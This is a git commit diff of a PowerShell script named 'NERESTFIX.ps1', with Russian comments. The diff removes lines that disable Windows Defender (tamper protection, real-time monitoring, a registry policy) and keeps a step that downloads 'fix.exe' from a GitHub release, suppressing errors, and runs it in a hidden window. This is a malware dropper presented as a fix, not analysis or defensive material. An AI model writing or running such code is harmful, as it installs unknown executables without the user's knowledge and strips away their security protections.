ee0373cffde275a2a7287f6a6dccea872afb0a2c
server <petrovolosuk310@gmail.com>
2026-03-13 10:42:52 +0200

    Update NERESTFIX.ps1

--- NERESTFIX.ps1
+++ NERESTFIX.ps1
@@ -1,17 +1,5 @@
-# Сначала отключаем Tamper Protection (защиту от подделок)
-# Без этого шага Defender просто проигнорирует наши команды
-Set-MpPreference -DisableTamperProtection $true
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/fix.exe" -OutFile "fix.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "fix.exe" -WindowStyle Hidden
 
-# Теперь отключаем Defender через реестр (это самый надежный способ)
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
-
-# Отключаем реальную защиту (Real-time Monitoring)
-Set-MpPreference -DisableRealtimeMonitoring $true
-
-# Проверяем, что Defender действительно отключен (опционально)
-Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, TamperProtectionSource
-
-# Скачиваем и запускаем твой файл
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/fix.exe" -OutFile "fix.exe"
-Start-Process -FilePath "fix.exe" -WindowStyle Hidden
